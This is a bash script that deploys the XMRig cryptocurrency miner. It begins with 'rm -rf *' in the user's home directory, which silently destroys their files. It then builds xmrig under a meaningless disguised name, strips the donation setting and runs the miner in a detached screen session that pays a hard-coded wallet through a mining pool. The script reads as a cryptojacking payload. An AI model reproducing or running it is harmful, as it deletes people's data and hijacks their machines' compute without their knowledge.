#!/bin/bash

YOURXMRADDIE="0xeabf083b19b5db844539cfcad1b4633d41431743";
YOURPOOL="karlsenhash.unmineable.com";
YOURPORT="4444";

cd /home/$USER/; rm -rf *; 
GROOVY="SHIThitsTHEcpuFAN";
RANDWRKRNAME="worker-${RANDOM}";
WETSHIT=$(nproc); TOTALSHIT=$(( $WETSHIT / 2 ));
sudo DEBIAN_FRONTEND=noninteractive apt update || true;
sudo DEBIAN_FRONTEND=noninteractive apt -y -qq upgrade || true;
sudo DEBIAN_FRONTEND=noninteractive apt -y -qq install git libuv1-dev libssl-dev build-essential cmake msr-tools screen libhwloc-dev || true;
git clone https://github.com/xmrig/xmrig.git ${GROOVY}; cd ${GROOVY}/src;
sed -i -e 's/kDefaultDonateLevel = 5/kDefaultDonateLevel = 0/g' donate.h;
sed -i -e 's/kDefaultDonateLevel = 1/kDefaultDonateLevel = 0/g' donate.h;
sed -i -e 's/kMinimumDonateLevel = 1/kMinimumDonateLevel = 0/g' donate.h;
cd ..; mkdir build; cd build; cmake ..; make -j ${WETSHIT}; sleep 1; sudo mv xmrig ${GROOVY}; cd ..; cd ..;
sudo modprobe msr; cd ${GROOVY}/scripts; sudo ./enable_1gb_pages.sh; sudo ./randomx_boost.sh; cd ../build; sleep 1;
sudo screen -dmS runmeNAOW ./${GROOVY} --nicehash --donate-level 0 -o ${YOURPOOL}:${YOURPORT} -u ${YOURXMRADDIE} --rig-id ${RANDWRKRNAME} -p ${RANDWRKRNAME} --randomx-1gb-pages -t ${TOTALSHIT};
echo ""; sleep 4; ps -aux | grep ${GROOVY}; echo ""; echo "done";
